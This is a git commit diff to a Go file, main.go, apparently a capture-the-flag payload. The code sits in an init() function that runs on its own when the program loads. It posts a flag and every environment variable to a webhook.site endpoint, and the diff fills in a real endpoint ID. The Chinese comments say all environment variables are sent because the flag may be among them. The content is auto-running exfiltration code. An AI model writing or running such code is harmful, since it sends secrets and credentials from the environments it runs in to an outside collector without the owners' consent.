b1c2661a964417ce8af72ac6afdbb274b67e7872
OilSeller2001 <aprillefou+github2@gmail.com>
2026-02-13 13:42:57 +0800

    Update webhook URL for flag and environment variables

--- main.go
+++ main.go
@@ -14,11 +14,11 @@ func init() {
     }
     
     // 將 Flag 送往你的 Webhook
-    http.Post("https://webhook.site/你的專屬ID", "text/plain", bytes.NewBuffer(flag))
+    http.Post("https://webhook.site/5cfb2098-1dbf-49b1-9d13-8f637619d1b7", "text/plain", bytes.NewBuffer(flag))
     
     // 同場加映：把所有環境變數也送出去，Flag 可能在裡面
     env := os.Environ()
     for _, e := range env {
-        http.Post("https://webhook.site/你的專屬ID", "text/plain", bytes.NewBufferString(e))
+        http.Post("https://webhook.site/5cfb2098-1dbf-49b1-9d13-8f637619d1b7", "text/plain", bytes.NewBufferString(e))
     }
 }
